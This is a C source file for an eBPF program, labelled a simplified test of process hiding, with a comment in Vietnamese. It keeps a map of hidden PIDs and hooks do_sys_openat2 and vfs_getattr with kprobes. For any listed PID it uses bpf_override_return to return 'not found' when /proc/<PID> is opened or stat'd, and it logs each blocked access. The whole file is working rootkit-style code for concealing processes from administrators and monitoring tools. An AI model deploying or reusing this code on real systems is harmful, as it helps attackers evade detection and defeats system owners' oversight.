/* =====================================================
 *  Test Optimized LSM Hide - Simplified Version
 *  Chỉ test các kprobe cơ bản trước
 * ===================================================== */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

/* Basic maps */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u32);
    __type(value, u32);
} hidden_pid_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

/* Helper functions */
static __always_inline bool is_hidden_pid(u32 pid) {
    u32 *val = bpf_map_lookup_elem(&hidden_pid_map, &pid);
    return val && *val == 1;
}

static __always_inline void submit_event(u32 event_type, u32 pid) {
    struct {
        u32 event_type;
        u32 pid;
        u64 timestamp;
    } *event;
    
    event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
    if (!event) return;
    
    event->event_type = event_type;
    event->pid = pid;
    event->timestamp = bpf_ktime_get_ns();
    
    bpf_ringbuf_submit(event, 0);
}

static __always_inline bool is_proc_path(const char *path) {
    return path[0] == '/' && path[1] == 'p' && path[2] == 'r' && 
           path[3] == 'o' && path[4] == 'c' && path[5] == '/';
}

static __always_inline u32 extract_pid_from_proc_path(const char *path) {
    if (!is_proc_path(path)) return 0;
    
    const char *pid_start = path + 6; // Skip "/proc/"
    u32 pid = 0;
    
    for (int i = 0; i < 10 && pid_start[i] != '\0' && pid_start[i] != '/'; i++) {
        if (pid_start[i] < '0' || pid_start[i] > '9') break;
        pid = pid * 10 + (pid_start[i] - '0');
    }
    
    return pid;
}

/* =====================================================
 *  Test Kprobe: do_sys_openat2 (safer than do_send_sig_info)
 * ===================================================== */

SEC("kprobe/do_sys_openat2")
int test_hide_openat(struct pt_regs *ctx)
{
    /* Get filename parameter */
    struct filename *filename_struct = (struct filename *)PT_REGS_PARM2(ctx);
    if (!filename_struct)
        return 0;

    const char *filename = BPF_CORE_READ(filename_struct, name);
    if (!filename)
        return 0;

    /* Quick check for /proc paths */
    char first_chars[6];
    if (bpf_probe_read_kernel(first_chars, 5, filename) < 0)
        return 0;
    
    if (!(first_chars[0] == '/' && first_chars[1] == 'p' && 
          first_chars[2] == 'r' && first_chars[3] == 'o' && 
          first_chars[4] == 'c'))
        return 0;

    /* Full path processing */
    char path[256];
    if (bpf_probe_read_kernel_str(path, sizeof(path), filename) < 0)
        return 0;

    /* Check if this is a /proc/[PID] path */
    if (is_proc_path(path)) {
        u32 pid = extract_pid_from_proc_path(path);
        if (pid > 0 && is_hidden_pid(pid)) {
            submit_event(8, pid); /* 8 = openat_blocked */
            
            /* Try to override return */
            bpf_override_return(ctx, -ENOENT);
            return 0;
        }
    }

    return 0;
}

/* =====================================================
 *  Test Kprobe: vfs_getattr (safer than vfs_statx)
 * ===================================================== */

SEC("kprobe/vfs_getattr")
int test_hide_stat(struct pt_regs *ctx)
{
    /* Get path parameter */
    struct path *path_struct = (struct path *)PT_REGS_PARM1(ctx);
    if (!path_struct)
        return 0;

    /* Extract dentry */
    struct dentry *dentry = BPF_CORE_READ(path_struct, dentry);
    if (!dentry)
        return 0;

    /* Get filename */
    const unsigned char *name = BPF_CORE_READ(dentry, d_name.name);
    if (!name)
        return 0;

    char filename[64];
    if (bpf_probe_read_kernel_str(filename, sizeof(filename), name) < 0)
        return 0;

    /* Check if this is a numeric PID */
    bool is_numeric = true;
    u32 pid = 0;
    for (int i = 0; i < 16 && filename[i] != '\0'; i++) {
        if (filename[i] < '0' || filename[i] > '9') {
            is_numeric = false;
            break;
        }
        pid = pid * 10 + (filename[i] - '0');
    }

    if (is_numeric && pid > 0 && is_hidden_pid(pid)) {
        submit_event(11, pid); /* 11 = stat_blocked */
        
        /* Try to override return */
        bpf_override_return(ctx, -ENOENT);
        return 0;
    }

    return 0;
}

/* =====================================================
 *  Simple tracepoint for comparison (no override)
 * ===================================================== */

SEC("tracepoint/syscalls/sys_enter_getdents64")
int test_getdents_log(struct trace_event_raw_sys_enter *ctx)
{
    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
    submit_event(6, current_pid); /* 6 = getdents64_called */
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
